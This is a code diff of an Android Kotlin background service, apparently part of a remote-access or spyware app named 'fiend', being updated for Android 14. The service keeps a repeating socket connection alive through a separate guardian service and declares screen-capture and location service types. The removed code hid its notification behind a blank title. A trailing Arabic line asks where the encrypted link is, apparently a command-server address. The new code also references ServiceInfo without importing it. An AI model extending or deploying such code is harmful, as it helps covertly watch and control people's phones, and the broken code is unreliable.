@@ -1,22 +1,25 @@
 package willi.fiend
 
-// ✅ التصحيح هنا (أضفنا Utils)
-import willi.fiend.Utils.AppSocket
 import android.annotation.SuppressLint
 import android.app.*
 import android.content.Intent
+import android.content.pm.PackageManager
+import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import android.widget.RemoteViews
 import androidx.core.app.NotificationCompat
+import willi.fiend.Utils.AppSocket
 
 class MainService : Service() {
 
     private val handler = Handler(Looper.getMainLooper())
+    private var isServiceRunning = false
 
     private val connectionRunnable = object : Runnable {
         override fun run() {
+            if (!isServiceRunning) return
             try {
                 Thread {
                     try {
@@ -41,18 +44,18 @@ class MainService : Service() {
         }
     }
 
-    override fun onBind(p0: Intent?): IBinder? {
-        return null
-    }
+    override fun onBind(p0: Intent?): IBinder? = null
 
     override fun onCreate() {
         super.onCreate()
+        isServiceRunning = true
         JobWakeUpService.isMainServiceRunning = true
-        startForeground(1, getNotification())
         
-        // ✅ تشغيل الحارس لمراقبة الخدمة
+        // ✅ بدء الخدمة في المقدمة مع توافق Android 14+
+        startForegroundWithCompatibility()
+        
         startService(Intent(this, GuardianService::class.java))
-    } // تم إصلاح القوس المزدوج هنا
+    }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         handler.postDelayed(connectionRunnable, 5000)
@@ -61,29 +64,76 @@ class MainService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
+        isServiceRunning = false
         JobWakeUpService.isMainServiceRunning = false
         handler.removeCallbacks(connectionRunnable)
     }
 
+    // ✅ دالة متوافقة مع Android 14+
     @SuppressLint("NewApi")
-    private fun getNotification(): Notification {
-        val channelId = "channel"
-        val channelName = " "
+    private fun startForegroundWithCompatibility() {
+        try {
+            val notification = createCompatibleNotification()
+            if (notification != null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    // Android 14+ يتطلب تحديد نوع الخدمة
+                    startForeground(
+                        1,
+                        notification,
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION or
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+                    )
+                } else {
+                    startForeground(1, notification)
+                }
+            } else {
+                // ✅ بدون إشعار (في حال عدم وجود إذن)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    startForeground(
+                        1,
+                        Notification(),
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                    )
+                } else {
+                    startForeground(1, Notification())
+                }
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
+
+    // ✅ إنشاء إشعار متوافق
+    @SuppressLint("NewApi")
+    private fun createCompatibleNotification(): Notification? {
+        val channelId = "fiend_channel"
+        val channelName = "Fiend Service"
+        
+        // ✅ التحقق من إذن الإشعارات في Android 13+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS) 
+                != PackageManager.PERMISSION_GRANTED) {
+                return null
+            }
+        }
+
         val channel = NotificationChannel(
             channelId,
             channelName,
-            NotificationManager.IMPORTANCE_MIN
+            NotificationManager.IMPORTANCE_LOW
         )
         channel.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
-        val manager = (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
+        
+        val manager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
         manager.createNotificationChannel(channel)
-        val notificationBuilder = NotificationCompat.Builder(this, channelId)
-        return notificationBuilder.setOngoing(true)
+
+        return NotificationCompat.Builder(this, channelId)
+            .setOngoing(true)
             .setSmallIcon(R.drawable.mpt)
-            .setContentTitle(" ")
-            .setBadgeIconType(NotificationCompat.BADGE_ICON_NONE)
-            .setPriority(NotificationManager.IMPORTANCE_UNSPECIFIED)
-            .setCustomBigContentView(RemoteViews(packageName, R.layout.notification))
+            .setContentTitle("Fiend Service")
+            .setContentText("Running in background")
+            .setPriority(NotificationCompat.PRIORITY_LOW)
             .build()
     }
-}
+} وين الرابط المشفر 
